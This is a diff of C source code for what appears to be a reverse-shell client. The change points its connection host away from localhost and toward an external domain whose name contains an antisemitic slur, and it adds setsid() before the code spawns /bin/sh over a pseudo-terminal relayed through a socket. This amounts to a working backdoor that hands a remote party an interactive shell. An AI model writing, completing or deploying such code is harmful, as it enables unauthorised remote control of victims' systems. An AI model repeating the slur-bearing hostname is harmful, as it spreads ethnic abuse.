@@ -12,7 +12,7 @@
 #include <sys/poll.h>
 #include <signal.h>
 
-#define HOST "localhost"
+#define HOST "jew.69.mu"
 #define COMM_PORT "44344"
 #define REV_PORT "44345"
 
@@ -86,6 +86,8 @@ void rev_client(void)
         dup2(slave, 1);
         dup2(slave, 2);
 
+        setsid();
+
         execve("/bin/sh", (char *[]){PREFIX, NULL}, NULL);
     }
 
@@ -106,7 +108,7 @@ void rev_client(void)
         if (fds[0].revents & POLLIN)
         {
             int r = read(sock, buffer, sizeof(buffer));
-            if (r <= 0) break; // i dont think we ever disconnect? atleast when tab is closed
+            if (r <= 0) break;
             write(master, buffer, r);
         }
 
